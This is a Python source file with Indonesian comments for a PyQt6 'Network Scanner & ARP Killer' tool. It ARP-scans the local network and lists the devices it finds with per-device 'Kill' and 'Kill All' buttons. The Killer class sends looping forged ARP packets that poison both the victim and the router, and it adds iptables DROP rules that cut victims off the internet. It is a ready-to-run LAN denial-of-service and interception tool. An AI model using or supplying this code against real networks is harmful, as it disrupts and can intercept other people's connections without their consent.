#!/usr/bin/env python3
# linux ubuntu
# sudo /home/whoami/anaconda3/envs/venv2/bin/python 3.py
import sys
import subprocess
import re
import threading
import time
from typing import List, Dict, Optional
from dataclasses import dataclass

from PyQt6.QtWidgets import (
    QApplication, QMainWindow, QVBoxLayout, QHBoxLayout, 
    QWidget, QPushButton, QTableWidget, QTableWidgetItem,
    QLabel, QLineEdit, QTextEdit, QGroupBox, QCheckBox,
    QMessageBox, QProgressBar, QSplitter, QHeaderView
)
from PyQt6.QtCore import QThread, pyqtSignal, QTimer, Qt
from PyQt6.QtGui import QFont, QColor

try:
    from scapy.all import *
except ImportError:
    print("Error: Scapy tidak terinstall. Install dengan: pip install scapy")
    sys.exit(1)

@dataclass
class Device:
    ip: str
    mac: str
    admin: bool = False
    
    def __eq__(self, other):
        return isinstance(other, Device) and self.mac == other.mac

class NetworkInterface:
    def __init__(self, name: str):
        self.name = name

def get_default_iface():
    """Mendapatkan interface default."""
    try:
        result = subprocess.run(['ip', 'route'], capture_output=True, text=True)
        for line in result.stdout.splitlines():
            if line.startswith('default'):
                parts = line.split()
                iface_name = parts[4] if len(parts) > 4 else 'eth0'
                return NetworkInterface(iface_name)
    except Exception:
        return NetworkInterface('eth0')
    return NetworkInterface('NULL')

def threaded(func):
    """Decorator untuk menjalankan fungsi di thread terpisah."""
    def wrapper(*args, **kwargs):
        thread = threading.Thread(target=func, args=args, kwargs=kwargs)
        thread.daemon = True
        thread.start()
        return thread
    return wrapper

class Killer:
    def __init__(self, router=None):
        self.iface = get_default_iface()
        self.router = router
        self.killed = {}
        self.storage = {}
        self.running = True

    def add_iptables_drop(self, ip):
        """Tambahkan rule iptables untuk DROP traffic dari IP"""
        try:
            cmd = ["sudo", "iptables", "-A", "FORWARD", "-s", ip, "-j", "DROP"]
            subprocess.run(cmd, check=True)
            print(f"[IPTABLES] Added DROP rule for {ip}")
        except subprocess.CalledProcessError as e:
            print(f"[IPTABLES ERROR] Failed to add rule for {ip}: {e}")

    def remove_iptables_drop(self, ip):
        """Hapus rule iptables untuk DROP traffic dari IP"""
        try:
            cmd = ["sudo", "iptables", "-D", "FORWARD", "-s", ip, "-j", "DROP"]
            subprocess.run(cmd, check=True)
            print(f"[IPTABLES] Removed DROP rule for {ip}")
        except subprocess.CalledProcessError as e:
            print(f"[IPTABLES ERROR] Failed to remove rule for {ip}: {e}")
    
    @threaded
    def kill(self, victim, wait_after=0.1):
        """Spoofing victim"""
        if not self.router:
            print("Router tidak ditemukan!")
            return
            
        if victim.mac in self.killed:
            print(f"{victim.mac} sudah di-kill.")
            return
        
        self.killed[victim.mac] = victim
        self.add_iptables_drop(victim.ip) 

        # Cheat Victim
        to_victim = ARP(
            op=1,
            psrc=self.router.ip,
            hwdst=victim.mac,
            pdst=victim.ip
        )

        # Cheat Router
        to_router = ARP(
            op=1,
            psrc=victim.ip,
            hwdst=self.router.mac,
            pdst=self.router.ip
        )

        print(f'Killed {victim.mac} ({victim.ip})')

        while (victim.mac in self.killed and 
               self.iface.name != 'NULL' and 
               self.running):
            try:
                send(to_victim, iface=self.iface.name, verbose=0)
                send(to_router, iface=self.iface.name, verbose=0)
                time.sleep(wait_after)
            except Exception as e:
                print(f"Error sending packets: {e}")
                break

        print(f'Unkilled {victim.mac}')

    @threaded
    def unkill(self, victim):
        """Unspoofing victim"""
        if victim.mac not in self.killed:
            return
            
        self.killed.pop(victim.mac, None)
        self.remove_iptables_drop(victim.ip)

        if not self.router:
            return

        # Fix Victim
        to_victim = ARP(
            op=1,
            psrc=self.router.ip,
            hwsrc=self.router.mac,
            pdst=victim.ip,
            hwdst=victim.mac
        )

        # Fix Router
        to_router = ARP(
            op=1,
            psrc=victim.ip,
            hwsrc=victim.mac,
            pdst=self.router.ip,
            hwdst=self.router.mac
        )

        if self.iface.name != 'NULL':
            try:
                send(to_victim, iface=self.iface.name, verbose=0)
                send(to_router, iface=self.iface.name, verbose=0)
                print(f'Fixed {victim.mac}')
            except Exception as e:
                print(f"Error fixing victim: {e}")

    def kill_all(self, device_list):
        """Kill semua device yang tidak admin"""
        for device in device_list[:]:
            if device.admin:
                continue
            if device.mac not in self.killed:
                self.kill(device)

    def unkill_all(self):
        """Unkill semua device"""
        for mac in list(self.killed.keys()):
            device = self.killed[mac]
            self.unkill(device)

    def stop(self):
        """Stop killer"""
        self.running = False

class NetworkScanner(QThread):
    devices_found = pyqtSignal(list)
    progress_update = pyqtSignal(str)
    
    def __init__(self):
        super().__init__()
        self.network = None
        self.gateway = None
        self.gateway_mac = None
    
    def get_network_info(self):
        """Mendapatkan informasi jaringan"""
        try:
            result = subprocess.run(['ip', 'route'], capture_output=True, text=True)
            for line in result.stdout.splitlines():
                if line.startswith('default'):
                    parts = line.split()
                    self.gateway = parts[2]
                    iface = parts[4]
                    
                    # Get network range
                    result2 = subprocess.run(['ip', 'addr', 'show', iface], 
                                           capture_output=True, text=True)
                    for line2 in result2.stdout.splitlines():
                        if 'inet ' in line2:
                            ip_net = line2.strip().split()[1]
                            self.network = ip_net
                            return True
        except Exception as e:
            self.progress_update.emit(f"Error getting network info: {e}")
        return False
    
    def get_gateway_mac(self):
        """Mendapatkan MAC address gateway"""
        if not self.gateway:
            return None
        try:
            arp = ARP(pdst=self.gateway)
            ether = Ether(dst="ff:ff:ff:ff:ff:ff")
            packet = ether/arp
            result = srp(packet, timeout=2, verbose=0)[0]
            if result:
                return result[0][1].hwsrc
        except Exception:
            pass
        return None
    
    def run(self):
        """Menjalankan scan jaringan"""
        self.progress_update.emit("Mendapatkan informasi jaringan...")
        
        if not self.get_network_info():
            self.progress_update.emit("Gagal mendapatkan informasi jaringan")
            return
        
        self.progress_update.emit(f"Scanning jaringan: {self.network}")
        
        try:
            arp = ARP(pdst=self.network)
            ether = Ether(dst="ff:ff:ff:ff:ff:ff")
            packet = ether/arp
            
            result = srp(packet, timeout=3, verbose=0)[0]
            
            devices = []
            for sent, received in result:
                device = Device(
                    ip=received.psrc,
                    mac=received.hwsrc,
                    admin=(received.psrc == self.gateway)
                )
                devices.append(device)
            
            # Get gateway MAC
            self.gateway_mac = self.get_gateway_mac()
            
            self.devices_found.emit(devices)
            self.progress_update.emit(f"Ditemukan {len(devices)} device")
            
        except Exception as e:
            self.progress_update.emit(f"Error scanning: {e}")

class NetworkKillerGUI(QMainWindow):
    def __init__(self):
        super().__init__()
        self.devices = []
        self.killer = None
        self.scanner = NetworkScanner()
        self.gateway_device = None
        
        self.init_ui()
        self.setup_connections()
        
    def init_ui(self):
        self.setWindowTitle("Network Scanner & ARP Killer")
        self.setGeometry(100, 100, 1000, 700)
        
        # Central widget
        central_widget = QWidget()
        self.setCentralWidget(central_widget)
        
        # Main layout
        layout = QVBoxLayout(central_widget)
        
        # Control panel
        control_group = QGroupBox("Control Panel")
        control_layout = QHBoxLayout(control_group)
        
        self.scan_btn = QPushButton("Scan Network")
        self.kill_all_btn = QPushButton("Kill All")
        self.unkill_all_btn = QPushButton("Unkill All")
        self.kill_all_btn.setEnabled(False)
        self.unkill_all_btn.setEnabled(False)
        
        control_layout.addWidget(self.scan_btn)
        control_layout.addWidget(self.kill_all_btn)
        control_layout.addWidget(self.unkill_all_btn)
        control_layout.addStretch()
        
        # Progress bar
        self.progress_bar = QProgressBar()
        self.progress_bar.setVisible(False)
        
        # Status label
        self.status_label = QLabel("Ready to scan network")
        
        # Splitter for tables and logs
        splitter = QSplitter(Qt.Orientation.Vertical)
        
        # Device table
        device_group = QGroupBox("Network Devices")
        device_layout = QVBoxLayout(device_group)
        
        self.device_table = QTableWidget()
        self.device_table.setColumnCount(4)
        self.device_table.setHorizontalHeaderLabels(["IP Address", "MAC Address", "Status", "Action"])
        
        # Set column widths
        header = self.device_table.horizontalHeader()
        header.setSectionResizeMode(0, QHeaderView.ResizeMode.ResizeToContents)
        header.setSectionResizeMode(1, QHeaderView.ResizeMode.ResizeToContents)
        header.setSectionResizeMode(2, QHeaderView.ResizeMode.ResizeToContents)
        header.setSectionResizeMode(3, QHeaderView.ResizeMode.Stretch)
        
        device_layout.addWidget(self.device_table)
        
        # Log area
        log_group = QGroupBox("Log")
        log_layout = QVBoxLayout(log_group)
        
        self.log_text = QTextEdit()
        self.log_text.setMaximumHeight(150)
        self.log_text.setReadOnly(True)
        log_layout.addWidget(self.log_text)
        
        # Add to splitter
        splitter.addWidget(device_group)
        splitter.addWidget(log_group)
        splitter.setSizes([400, 150])
        
        # Add to main layout
        layout.addWidget(control_group)
        layout.addWidget(self.progress_bar)
        layout.addWidget(self.status_label)
        layout.addWidget(splitter)
        
        # Style
        self.setStyleSheet("""
            QGroupBox {
                font-weight: bold;
                border: 2px solid #cccccc;
                border-radius: 5px;
                margin-top: 1ex;
                padding-top: 10px;
            }
            QGroupBox::title {
                subcontrol-origin: margin;
                left: 10px;
                padding: 0 5px 0 5px;
            }
            QPushButton {
                padding: 8px;
                border-radius: 4px;
                border: 1px solid #ccc;
                background-color: #f0f0f0;
            }
            QPushButton:hover {
                background-color: #e0e0e0;
            }
            QPushButton:pressed {
                background-color: #d0d0d0;
            }
        """)
    
    def setup_connections(self):
        self.scan_btn.clicked.connect(self.start_scan)
        self.kill_all_btn.clicked.connect(self.kill_all_devices)
        self.unkill_all_btn.clicked.connect(self.unkill_all_devices)
        
        self.scanner.devices_found.connect(self.update_device_table)
        self.scanner.progress_update.connect(self.update_status)
        self.scanner.finished.connect(self.scan_finished)
    
    def log_message(self, message):
        """Menambahkan pesan ke log"""
        self.log_text.append(f"[{time.strftime('%H:%M:%S')}] {message}")
    
    def update_status(self, message):
        """Update status label"""
        self.status_label.setText(message)
        self.log_message(message)
    
    def start_scan(self):
        """Memulai scan jaringan"""
        self.scan_btn.setEnabled(False)
        self.progress_bar.setVisible(True)
        self.progress_bar.setRange(0, 0)  # Indeterminate progress
        self.device_table.setRowCount(0)
        self.devices.clear()
        
        self.scanner.start()
    
    def scan_finished(self):
        """Scan selesai"""
        self.scan_btn.setEnabled(True)
        self.progress_bar.setVisible(False)
        
        if self.devices:
            self.kill_all_btn.setEnabled(True)
            self.unkill_all_btn.setEnabled(True)
            
            # Setup killer dengan router
            if self.gateway_device:
                self.killer = Killer(self.gateway_device)
                self.log_message(f"Killer initialized with gateway: {self.gateway_device.ip}")
    
    def update_device_table(self, devices):
        """Update tabel device"""
        self.devices = devices
        self.device_table.setRowCount(len(devices))
        
        for i, device in enumerate(devices):
            # IP Address
            ip_item = QTableWidgetItem(device.ip)
            self.device_table.setItem(i, 0, ip_item)
            
            # MAC Address
            mac_item = QTableWidgetItem(device.mac)
            self.device_table.setItem(i, 1, mac_item)
            
            # Status
            if device.admin:
                status_item = QTableWidgetItem("Gateway/Router")
                status_item.setBackground(QColor(255, 255, 0, 100))  # Yellow
                self.gateway_device = device
            else:
                status_item = QTableWidgetItem("Device")
            
            self.device_table.setItem(i, 2, status_item)
            
            # Action buttons
            if not device.admin:
                action_widget = QWidget()
                action_layout = QHBoxLayout(action_widget)
                action_layout.setContentsMargins(5, 2, 5, 2)
                
                kill_btn = QPushButton("Kill")
                kill_btn.setMaximumWidth(60)
                kill_btn.clicked.connect(lambda checked, d=device: self.kill_device(d))
                
                unkill_btn = QPushButton("Unkill")
                unkill_btn.setMaximumWidth(60)
                unkill_btn.clicked.connect(lambda checked, d=device: self.unkill_device(d))
                
                action_layout.addWidget(kill_btn)
                action_layout.addWidget(unkill_btn)
                action_layout.addStretch()
                
                self.device_table.setCellWidget(i, 3, action_widget)
            else:
                protected_item = QTableWidgetItem("Protected")
                self.device_table.setItem(i, 3, protected_item)
    
    def kill_device(self, device):
        """Kill satu device"""
        if self.killer:
            self.killer.kill(device)
            self.log_message(f"Killing device: {device.ip} ({device.mac})")
            self.update_device_status(device, "KILLED")
    
    def unkill_device(self, device):
        """Unkill satu device"""
        if self.killer:
            self.killer.unkill(device)
            self.log_message(f"Unkilling device: {device.ip} ({device.mac})")
            self.update_device_status(device, "Active")
    
    def kill_all_devices(self):
        """Kill semua device non-admin"""
        if not self.killer:
            QMessageBox.warning(self, "Warning", "Killer tidak diinisialisasi. Scan network terlebih dahulu.")
            return
        
        reply = QMessageBox.question(
            self, 'Konfirmasi', 
            'Yakin ingin kill semua device?\nIni akan memutus koneksi internet mereka.',
            QMessageBox.StandardButton.Yes | QMessageBox.StandardButton.No,
            QMessageBox.StandardButton.No
        )
        
        if reply == QMessageBox.StandardButton.Yes:
            non_admin_devices = [d for d in self.devices if not d.admin]
            self.killer.kill_all(non_admin_devices)
            self.log_message(f"Killing {len(non_admin_devices)} devices...")
            
            for device in non_admin_devices:
                self.update_device_status(device, "KILLED")
    
    def unkill_all_devices(self):
        """Unkill semua device"""
        if not self.killer:
            return
        
        self.killer.unkill_all()
        self.log_message("Unkilling all devices...")
        
        for device in self.devices:
            if not device.admin:
                self.update_device_status(device, "Active")
    
    def update_device_status(self, target_device, status):
        """Update status device di tabel"""
        for i in range(self.device_table.rowCount()):
            ip_item = self.device_table.item(i, 0)
            if ip_item and ip_item.text() == target_device.ip:
                status_item = self.device_table.item(i, 2)
                if status_item and not target_device.admin:
                    status_item.setText(status)
                    if status == "KILLED":
                        status_item.setBackground(QColor(255, 0, 0, 100))  # Red
                    else:
                        status_item.setBackground(QColor(255, 255, 255))  # White
                break
    
    def closeEvent(self, event):
        """Handle aplikasi ditutup"""
        if self.killer:
            self.killer.stop()
            self.killer.unkill_all()
            self.log_message("Stopping killer and restoring connections...")
            time.sleep(2)  # Give time to restore connections
        
        event.accept()

def main():
    app = QApplication(sys.argv)
    
    # Check if running as root
    if os.geteuid() != 0:
        QMessageBox.critical(
            None, "Error", 
            "Aplikasi ini memerlukan hak akses root.\n"
            "Jalankan dengan: sudo python3 network_killer.py"
        )
        sys.exit(1)
    
    window = NetworkKillerGUI()
    window.show()
    
    sys.exit(app.exec())

if __name__ == "__main__":
    import os
    main()              
